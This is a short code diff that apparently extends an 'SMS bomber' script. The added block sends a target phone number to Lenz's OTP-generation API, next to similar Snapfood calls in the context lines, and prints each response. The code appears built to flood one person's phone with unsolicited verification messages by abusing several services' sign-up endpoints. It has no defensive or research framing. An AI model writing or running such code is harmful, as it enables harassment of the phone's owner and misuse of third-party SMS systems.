@@ -61,3 +61,9 @@ else:
             print(f"snap food 2 status: {snapfood2}")
         except:
             print("snap food 2 not")
+        try:
+            data_lenz = {"msisdn":str(phone_shad)}
+            lenz = requests.post('https://app.lenz.ir:64014/api/v2/auth/register/otp/generate', json=data_lenz)
+            print(f'lenz status {lenz}')
+        except:
+            print('lenz not')
